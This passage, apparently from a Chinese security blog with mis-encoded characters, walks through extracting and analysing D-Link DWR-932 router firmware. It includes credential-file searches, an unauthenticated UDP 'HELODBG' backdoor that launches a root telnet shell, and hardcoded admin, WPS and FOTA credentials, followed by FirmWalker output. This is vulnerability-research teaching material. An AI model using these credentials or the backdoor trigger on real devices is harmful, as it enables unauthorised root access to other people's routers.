interface</code>é€‰æ‹©è¦ç›‘å¬çš„è®¾å¤‡ï¼Œè¿™é‡Œé€‰æ‹©ç½‘å¡<code>eth0</code></li><li>å¯åŠ¨Wiresharkç¨‹åºï¼Œå¯¹<code>eth0</code>è¿›è¡ŒæŠ“åŒ…</li></ol><p><img src="/img/article/iot-1/image-20220914135308518.png" alt="image-20220914135308518"></p><ol start="7"><li>æ ¹æ®å®é™…éœ€æ±‚è¿‡æ»¤å…³æ³¨çš„æŠ¥æ–‡</li></ol><h2 id="å›ºä»¶æ–‡ä»¶åˆ†æ"><a href="#å›ºä»¶æ–‡ä»¶åˆ†æ" class="headerlink" title="å›ºä»¶æ–‡ä»¶åˆ†æ"></a>å›ºä»¶æ–‡ä»¶åˆ†æ</h2><blockquote><p>ä¸€èˆ¬ç›´æ¥ä½¿ç”¨ <code>binwalk -eM file.bin</code> å³å¯åˆ†è§£æ–‡ä»¶</p></blockquote><h3 id="D-Link-923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–"><a href="#D-Link-923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–" class="headerlink" title="D-Link 923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–"></a>D-Link 923Bå›ºä»¶æ–‡ä»¶ç³»ç»Ÿè·å–</h3><blockquote><p>å›ºä»¶å‹ç¼©åŒ…<a href="https://media.dlink.eu/ftp/products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_02_eu_en_20150709.zip">ä¸‹è½½é“¾æ¥</a>ï¼Œç‰ˆæœ¬å·ä¸ºDWR-932_fw_revB_2_02_eu_en_20150709ã€‚å®‰å…¨ç ”ç©¶å‘˜Gianni Carabelliå’ŒPierre Kimå·²ç»åœ¨è¿™æ¬¾å›ºä»¶ä¸­æŒ–æ˜å‡ºäº†æ¼æ´ï¼Œè¿™é‡Œæˆ‘ä»¬åªæ˜¯ç”¨äºç»ƒä¹ </p></blockquote><p>é¦–å…ˆæ˜¯ä»å›ºä»¶ä¸­æå–æ–‡ä»¶ç³»ç»Ÿï¼Œå†…æœ‰åŠ å¯†è¿‡çš„zipå‹ç¼©åŒ…ï¼Œå¯ä»¥ä½¿ç”¨<code>fcrackzip</code>è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œè¿™é‡Œçœç•¥çˆ†ç ´è¿‡ç¨‹ï¼Œç›´æ¥è¾“å…¥å¯†ç  <strong>beUT9Z</strong></p><p><img src="/img/article/iot-1/image-20220914145816127.png" alt="å‹ç¼©åŒ…å·²åŠ å¯†"></p><p>æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨é’ˆå¯¹yaffs2æ ¼å¼ çš„å·¥å…·è§£å‹æ–‡ä»¶ç³»ç»Ÿæ¥æå–2K-mdm-image-mdm9625.yaffs2æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡Binwalkæ¥å®Œæˆæå–å·¥ä½œã€‚</p><blockquote><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯unyaffsï¼Œä¸‹è½½é“¾æ¥ <a href="https://code.google.com/archive/p/unyaffs/downloads">Google Code Archive - Long-term storage for Google Code Project Hosting.</a></p></blockquote><p>ä¸‹è½½å¯æ‰§è¡Œç¨‹åºåï¼Œä½¿ç”¨<code>./unyaffs file.yaffs2</code>æŒ‡ä»¤å³å¯</p><p><img src="/img/article/iot-1/image-20220914192637485.png" alt="image-20220914192637485"></p><p><img src="/img/article/iot-1/image-20220914192719147.png" alt="è§£å‹å‡ºçš„æ–‡ä»¶ç³»ç»Ÿ"></p><h3 id="æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜"><a href="#æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜" class="headerlink" title="æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜"></a>æ‰‹åŠ¨ä¿¡æ¯æŒ–æ˜</h3><p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨è¿™ä¸ªæ–‡ä»¶ç›®å½•ä¸­æŸ¥æ‰¾æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.conf&quot;</span><br>find . -name <span class="hljs-string">&quot;shadow&quot;</span><br>find . -name <span class="hljs-string">&quot;passwd&quot;</span><br>find . -name <span class="hljs-string">&quot;*config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*history*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh*_config*&quot;</span><br>find . -name <span class="hljs-string">&quot;*ssh_host*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914194404354.png" alt="æœç´¢ç¤ºä¾‹"></p><p>åœ¨<code>inadyn-mt.conf </code>æ–‡ä»¶ä¸­å­˜å‚¨äº†è·¯ç”±å™¨çš„no-IPé…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨äºè®¿é—®ç½‘ç«™ <a href="https://www.no-ip.com/">no-ip</a>çš„ç”¨æˆ·åå’Œå£ä»¤</p><p><img src="/img/article/iot-1/image-20220914195009565.png" alt="image-20220914195009565"></p><p>æŸ¥çœ‹shadowæ–‡ä»¶</p><p><img src="/img/article/iot-1/image-20220914195346782.png" alt="image-20220914195346782"></p><p>æŸ¥çœ‹passwdæ–‡ä»¶</p><p><img src="/img/article/iot-1/image-20220914195118433.png" alt="image-20220914195118433"></p><h3 id="åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯"><a href="#åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯" class="headerlink" title="åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯"></a>åˆ©ç”¨Firmwalkeræœç´¢æ•æ„Ÿä¿¡æ¯</h3><p>å®‰è£…firmwalker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i -g eslint                                                                       <br><br>git <span class="hljs-built_in">clone</span> https://github.com/craigz28/firmwalker.git <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./firmwalker.sh &#123;floder path&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Firmwalkerè„šæœ¬èƒ½å¤Ÿè¯†åˆ«å‡ºå¤šç§æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶æ–‡ä»¶ã€ è¯ä¹¦ã€IPåœ°å€ã€ç§é’¥ç­‰ï¼ŒåŒæ—¶å°†è¾“å‡ºç»“æœéƒ½ä¿å­˜åœ¨<strong>firmwalker.txt</strong>æ–‡ ä»¶ä¹‹ä¸­</p></blockquote><p><img src="/img/article/iot-1/image-20220914202334231.png" alt="image-20220914202334231"></p><p><img src="/img/article/iot-1/image-20220914204146429.png" alt="firmwalker.txt"></p><h3 id="æŸ¥çœ‹å¯åŠ¨é¡¹"><a href="#æŸ¥çœ‹å¯åŠ¨é¡¹" class="headerlink" title="æŸ¥çœ‹å¯åŠ¨é¡¹"></a>æŸ¥çœ‹å¯åŠ¨é¡¹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/init.d<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-1/image-20220914214159035.png" alt="image-20220914214159035"></p><p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹ <strong>start_appmgr</strong>è„šæœ¬ï¼Œä¸€èˆ¬æ¥è¯´mgrå°±æ˜¯ä¸»æ§ç¨‹åºçš„æ„æ€  </p><p><img src="/img/article/iot-1/image-20220914214951502.png" alt="image-20220914214951502"></p><p>å¯ä»¥çœ‹åˆ°è¯¥è„šæœ¬åœ¨å¼€æœºæ—¶ä¼šä»¥æœåŠ¡çš„å½¢å¼è¿è¡Œ<code>/bin/appmgr</code>ç¨‹åºï¼ŒåŒæ—¶è¯¥è„šæœ¬è¿˜ä¼šå¼€å¯<strong>telnet</strong>æœåŠ¡</p><p><img src="/img/article/iot-1/image-20220914215128332.png" alt="image-20220914215128332"></p><h3 id="appmgråˆ†æ"><a href="#appmgråˆ†æ" class="headerlink" title="appmgråˆ†æ"></a>appmgråˆ†æ</h3><p>ç”¨IDA PROæ‰“å¼€<code>/bin/appmg</code>ç¨‹åºè¿›è¡Œé€†å‘åˆ†æï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæŒç»­ç›‘å¬ 0.0.0.0:39889ï¼ˆUDPï¼‰ï¼ˆè¿™ä¸ªIPå’Œç«¯å£è¿˜æ˜¯æ²¡æœ‰ç¡®å®šå‡ºæ¥ï¼‰ï¼Œå¹¶ç­‰å¾…ä¼ å…¥æ§åˆ¶å‘½ä»¤,å¦‚æœæŸä¸ªç”¨æˆ·å‘ç›®æ ‡è·¯ç”±å™¨å‘é€äº†ä¸€ä¸ª <code>HELODBG</code> å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè·¯ç”±å™¨å°†ä¼šæ‰§è¡Œ <code>/sbin/telnetd -l /bin/sh</code> ï¼Œå¹¶å…è®¸è¿™åç”¨æˆ·åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹ä»¥ root ç”¨æˆ·çš„èº«ä»½ç™»å½•è·¯ç”±å™¨ã€‚</p><blockquote><p>è¿™é‡Œçš„-11877è½¬æ¢äºŒè¿›åˆ¶åï¼Œæœ«å°¾ä¸¤å­—èŠ‚ä¸ºportï¼Œå‰é¢éƒ½æ˜¯0ï¼Œæœ«å°¾å­—èŠ‚ä¸º<strong>\xD1\x9B</strong>æ³¨æ„å°æ®µå­˜å‚¨æ–¹å¼ï¼Œåˆ™portå·ä¸º<strong>9BD1</strong>å³<strong>39889</strong></p></blockquote><p><img src="/img/article/iot-1/image-20220914223737117.png" alt="image-20220914223737117"></p><p><img src="/img/article/iot-1/image-20220914223809561.png" alt="image-20220914223809561"></p><p>æœç´¢ <strong>mod_sysadm_config_passwd</strong> å‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°adminé»˜è®¤å¯†ç </p><p><img src="/img/article/iot-1/image-20220914231714471.png" alt="image-20220914231714471"></p><p>è·¯ç”±å™¨çš„ç®¡ç†å‘˜è´¦å·ã€‚è®¾å¤‡çš„ç®¡ç†å‘˜è´¦å·é»˜è®¤ä¸ºâ€œadminâ€ï¼Œè€Œå¯†ç åŒæ ·ä¹Ÿæ˜¯â€œadminâ€ã€‚</p><p>æœç´¢ <strong>wifi_get_default_wps_pin</strong> å‡½æ•°</p><p><img src="/img/article/iot-1/image-20220914231829944.png" alt="image-20220914231829944"></p><p>é»˜è®¤é…ç½®ä¸‹ï¼Œè¯¥è·¯ç”±å™¨ WPS ç³»ç»Ÿçš„ PIN ç æ°¸è¿œéƒ½æ˜¯ <code>28296607</code> å› ä¸ºè¿™ä¸ª PIN ç æ˜¯ç¡¬ç¼–ç åœ¨ <code>/bin/appmgr</code> ç¨‹åºä¸­</p><h3 id="fotad-åˆ†æ"><a href="#fotad-åˆ†æ" class="headerlink" title="fotad åˆ†æ"></a>fotad åˆ†æ</h3><p>è·¯ç”±å™¨ä¸ FOTA æœåŠ¡å™¨è¿›è¡Œé€šä¿¡æ—¶çš„å‡­è¯æ•°æ®ç¡¬ç¼–ç åœ¨ <code>/sbin/fotad</code> ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç”¨ IDA è¿›è¡Œåˆ†æ</p><p>æœç´¢ <code>sub_CAAC </code>å‡½æ•°,å¯ä»¥å‘ç°è¢« base64 è¿‡çš„å‡­è¯</p><p><img src="/img/article/iot-1/image-20220914232237866.png" alt="image-20220914232237866"></p><p>ç”¨æˆ·&#x2F;å¯†ç å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cWRwYzpxZHBj        qdpc:qdpc<br>cWRwZTpxZHBl        qdpe:qdpe<br><span class="hljs-attribute">cWRwOnFkcA</span>==        qdp:qdp<br></code></pre></td></tr></table></figure><h3 id="UPnPå®‰å…¨é—®é¢˜"><a href="#UPnPå®‰å…¨é—®é¢˜" class="headerlink" title="UPnPå®‰å…¨é—®é¢˜"></a>UPnPå®‰å…¨é—®é¢˜</h3><p>UPnP å…è®¸ç”¨æˆ·åŠ¨æ€æ·»åŠ é˜²ç«å¢™è§„åˆ™ã€‚å› ä¸ºè¿™ç§åšæ³•ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œå› æ­¤è®¾å¤‡é€šå¸¸éƒ½ä¼šå¯¹è¿™ç§æ“ä½œè¿›è¡Œé™åˆ¶ï¼Œä»¥é¿å…ä¸å—ä¿¡ä»»çš„å®¢æˆ·ç«¯æ·»åŠ ä¸å®‰å…¨çš„é˜²ç«å¢™è§„åˆ™ã€‚</p><p>UPnP çš„ä¸å®‰å…¨æ€§æ—©åœ¨2006å¹´å°±å·²ç»æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„äº‹æƒ…äº†ã€‚è€Œè¯¥è·¯ç”±å™¨ä¸­ UPnP ç¨‹åºçš„å®‰å…¨ç­‰çº§ä»ç„¶éå¸¸çš„ä½ï¼Œå¤„äºå±€åŸŸç½‘å†…çš„æ”»å‡»è€…å¯ä»¥éšæ„ä¿®æ”¹è·¯ç”±å™¨çš„ç«¯å£è½¬å‘è§„åˆ™ã€‚</p><p>æ–‡ä»¶ <code>/var/miniupnpd.conf</code> æ˜¯ç”± <code>/bin/appmgr</code> ç¨‹åºç”Ÿæˆçš„ï¼š</p><p>æœç´¢ sub_2AE0C å‡½æ•°</p><p><img src="/img/article/iot-1/image-20220914232710172.png" alt="image-20220914232710172"></p><p>è¯¥ç¨‹åºä¼šç”Ÿæˆ <code>/var/miniupnpd.conf</code>ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ext_ifname</span>=rmnet0<br><span class="hljs-attr">listening_ip</span>=bridge0<br><span class="hljs-attr">port</span>=<span class="hljs-number">2869</span><br><span class="hljs-attr">enable_natpmp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">enable_upnp</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">bitrate_up</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">bitrate_down</span>=<span class="hljs-number">14000000</span><br><span class="hljs-attr">secure_mode</span>=<span class="hljs-literal">no</span>      <span class="hljs-comment"># &quot;secure&quot; mode : when enabled, UPnP client are allowed to add mappings only to their IP.</span><br><span class="hljs-attr">presentation_url</span>=http://<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><br><span class="hljs-attr">system_uptime</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">notify_interval</span>=<span class="hljs-number">30</span><br><span class="hljs-attr">upnp_forward_chain</span>=MINIUPNPD<br><span class="hljs-attr">upnp_nat_chain</span>=MINIUPNPD<br></code></pre></td></tr></table></figure><h2 id="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"><a href="#åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ" class="headerlink" title="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"></a>åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ</h2><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>å®‰è£…<strong>FAT(Firmware-Analysis-Toolkit)<strong>ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼Œä½†éœ€æ³¨æ„ç¯å¢ƒéœ€åŒæ—¶å…·æœ‰</strong>python2</strong>å’Œ<strong>python3</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>Kaliå’ŒUbuntuå®‰è£…éƒ½å‡ºç°äº†ä¸€äº›é—®é¢˜äººéº»äº†</p></blockquote><p><img src="/img/article/iot-1/image-20220914212925067.png" alt="Ubuntuå®‰è£…é”™è¯¯"></p><p>Kaliåˆ™æ˜¯æŠ¥æ‰¾ä¸åˆ°<strong>Package â€˜lsb-coreâ€™ has no installation candidate</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D-Link 923Bè·¯ç”±å™¨æ•æ„Ÿä¿¡æ¯æœé›†</title>
    <link href="/2022/09/14/firmwalker-DLINK923B/"/>
    <url>/2022/09/14/firmwalker-DLINK923B/</url>
    
    <content type="html"><![CDATA[<p><em><strong>Firmware Directory</strong></em><br>&#x2F;root&#x2F;iot&#x2F;D-LINK923B&#x2F;2k&#x2F;root<br><em><strong>Search for password files</strong></em><br>##################################### passwd<br>t&#x2F;bin&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd</p><p>##################################### shadow<br>t&#x2F;etc&#x2F;shadow</p><p>##################################### *.psk</p><p><em><strong>Search for Unix-MD5 hashes</strong></em></p><p><em><strong>Search for SSL related files</strong></em><br>##################################### *.crt</p><p>##################################### *.pem</p><p>##################################### *.cer</p><p>##################################### *.p7b</p><p>##################################### *.p12</p><p>##################################### *.key</p><p><em><strong>Search for SSH related files</strong></em><br>##################################### authorized_keys</p><p>##################################### <em>authorized_keys</em></p><p>##################################### host_key</p><p>##################################### <em>host_key</em></p><p>##################################### id_rsa</p><p>##################################### <em>id_rsa</em></p><p>##################################### id_dsa</p><p>##################################### <em>id_dsa</em></p><p>##################################### *.pub</p><p><em><strong>Search for files</strong></em><br>##################################### *.conf<br>t&#x2F;etc&#x2F;wpa_supplicant.conf<br>t&#x2F;etc&#x2F;avahi&#x2F;avahi-daemon.conf<br>t&#x2F;etc&#x2F;pimd.conf<br>t&#x2F;etc&#x2F;mdev.conf<br>t&#x2F;etc&#x2F;AR6004_AP1_hostapd.conf<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;session.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.conf<br>t&#x2F;etc&#x2F;hostapd.conf<br>t&#x2F;etc&#x2F;host.conf<br>t&#x2F;etc&#x2F;AR6003_hostapd.conf<br>t&#x2F;etc&#x2F;igd&#x2F;miniupnpd.conf<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;AR6004_hostapd.conf<br>t&#x2F;etc&#x2F;radvd.conf<br>t&#x2F;etc&#x2F;AR6003_AP1_hostapd.conf</p><p>##################################### *.cfg</p><p>##################################### *.ini</p><p><em><strong>Search for database related files</strong></em><br>##################################### *.db</p><p>##################################### *.sqlite</p><p>##################################### *.sqlite3</p><p><em><strong>Search for shell scripts</strong></em><br>##################################### shell scripts<br>t&#x2F;etc&#x2F;rc4.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;usb.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automountsdcard.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automounthdd.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;find-touchscreen.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gdbus-bash-completion.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gsettings-bash-completion.sh<br>t&#x2F;etc&#x2F;rc2.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S04modutils.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02sysfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S38devpts.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S06alignment.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S45mountnfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S39hostname.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S10checkroot.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02banner.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S37populate-volatile.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S35mountall.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S55bootmisc.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S01keymap.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;modutils.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;banner.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;devpts.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hostname.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;save-rtc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;sysfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;set-hwver.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;keymap.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountall.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;alignment.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;rmnologin.sh<br>t&#x2F;etc&#x2F;rc5.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;qdt_rc0clean.sh<br>t&#x2F;etc&#x2F;rc3.d&#x2F;S99rmnologin.sh</p><p><em><strong>Search for other .bin files</strong></em><br>##################################### bin files<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;bdata.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;fw-3.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;utf.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;bdata.SD31.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athtcmd_ram.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;data.patch.hw3_0.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athwlan_router.bin</p><p><em><strong>Search for patterns in files</strong></em><br>â€”â€”â€”â€”â€”â€”â€“ upgrade â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;fotad<br>t&#x2F;bin&#x2F;lcdd<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;lcdtest<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.prerm</p><p>â€”â€”â€”â€”â€”â€”â€“ admin â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;cgi-bin&#x2F;qcmap_auth<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst</p><p>â€”â€”â€”â€”â€”â€”â€“ root â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;ip.iproute2<br>t&#x2F;sbin&#x2F;readprofile.util-linux<br>t&#x2F;sbin&#x2F;shutdown.sysvinit<br>t&#x2F;sbin&#x2F;fdisk.util-linux<br>t&#x2F;sbin&#x2F;dnsmasq_qmi<br>t&#x2F;sbin&#x2F;swapon.util-linux<br>t&#x2F;sbin&#x2F;dlna6_dms<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;sbin&#x2F;miniupnpd<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;sbin&#x2F;ctrlaltdel<br>t&#x2F;sbin&#x2F;killall5<br>t&#x2F;sbin&#x2F;cfdisk<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;default&#x2F;volatiles&#x2F;00_core<br>t&#x2F;etc&#x2F;shadow<br>t&#x2F;etc&#x2F;securetty<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;limits<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;usb<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;power_config<br>t&#x2F;etc&#x2F;init.d&#x2F;avahi-daemon<br>t&#x2F;etc&#x2F;group<br>t&#x2F;etc&#x2F;udhcpc.d&#x2F;udhcpc.script<br>t&#x2F;etc&#x2F;gshadow<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;group-<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-files.list</p><p>â€”â€”â€”â€”â€”â€”â€“ password 